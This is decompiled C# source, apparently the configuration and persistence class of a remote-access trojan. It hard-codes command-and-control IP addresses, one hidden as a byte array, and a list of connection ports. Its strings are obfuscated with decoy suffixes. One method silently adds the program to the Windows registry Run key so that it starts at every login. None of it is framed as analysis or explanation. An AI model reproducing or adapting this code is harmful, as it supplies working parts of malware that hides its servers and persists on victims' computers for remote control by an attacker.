using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace narthimesa;

internal static class CEAZRNF
{
	public static int narthimesaport;

	public static string ithgaravaappPath = Application.get_ExecutablePath().ToString();

	public static string narthimesapc_id = "wgrave|narthimesa".Split(new char[1] { '|' })[0];

	public static string narthimesaremvUser = "nwtdornrt|narthimesa".Split(new char[1] { '|' })[0];

	public static string narthimesafilesLogs = "cithabla".Split(new char[1] { '|' })[0];

	public static string narthimesaAppPath = "";

	public static string narthimesadefaultP = "150.223.225.254|narthimesa".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 4676, 6658, 9666, 12824, 16624 };

	public static byte[] narthimesavpsips = new byte[13]
	{
		54, 52, 46, 49, 56, 56, 46, 49, 50, 46,
		49, 50, 54
	};

	public static string narthimesamainApp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath().ToString());

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string narthimesaOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!narthimesa".Split(new char[1] { '!' })[0];
		}
	}

	public static void narthimesaset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|narthimesa".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = narthimesapc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (path != value.ToString())
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string narthimesaget_mpath()
	{
		return Path.GetDirectoryName(ithgaravaappPath) + "\\";
	}
}
